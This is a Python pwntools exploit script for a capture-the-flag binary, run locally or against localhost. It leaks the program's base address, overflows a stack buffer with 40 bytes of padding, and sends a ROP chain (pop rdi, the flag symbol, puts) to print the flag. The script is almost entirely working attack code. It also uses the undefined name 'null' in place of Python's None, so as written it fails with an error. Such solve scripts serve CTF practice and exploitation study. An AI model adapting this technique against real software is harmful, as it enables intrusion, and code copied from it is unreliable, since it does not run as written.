#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/chall"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "localhost", 35002
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/master/tools/gdb/pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            
            """
            gdb.attach(io, gdbscript=cmd)
    io.recvuntil(b": ")
    elf.address = int(io.recvuntil(b"\n", drop=True), 16) - elf.symbols["main"]
    print("elf.address              :", hex(elf.address))
    p = b"A"*(40)
    # saved RIP
    p += p64(elf.search(asm("pop rdi; ret")).__next__())
    p += p64(elf.symbols['flag'])
    p += p64(elf.symbols["puts"])
    io.sendline(p)
    io.interactive()
    
if __name__ == "__main__":
	io, libc = null, null
	if args.REMOTE:
		REMOTE = True
		io = remote(HOST, PORT)
		# libc = ELF("___")

	else:
		LOCAL = True
		io = process(
		[TARGET, ],
		env={
		#     "LD_PRELOAD":DIR+"/___",
		#     "LD_LIBRARY_PATH":DIR+"/___",
		},
		)
		# libc = ELF("___")
	exploit(io, libc)